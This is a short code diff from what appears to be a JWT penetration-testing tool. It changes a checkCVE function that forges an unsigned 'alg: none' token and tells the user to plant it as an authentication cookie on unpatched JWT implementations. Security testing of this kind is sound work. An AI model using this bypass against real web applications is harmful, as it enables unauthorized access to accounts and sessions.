@@ -92,7 +92,7 @@ def signToken(headDict, paylDict, key, keyLength):
 
 def checkCVE(headDict, tok2):
 	print "\nGenerating alg-stripped token..."
-	alg = "None"
+	alg = "none"
 	newHead = buildHead(alg, headDict)
 	CVEToken = newHead+"."+tok2+"."
 	print "\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)"
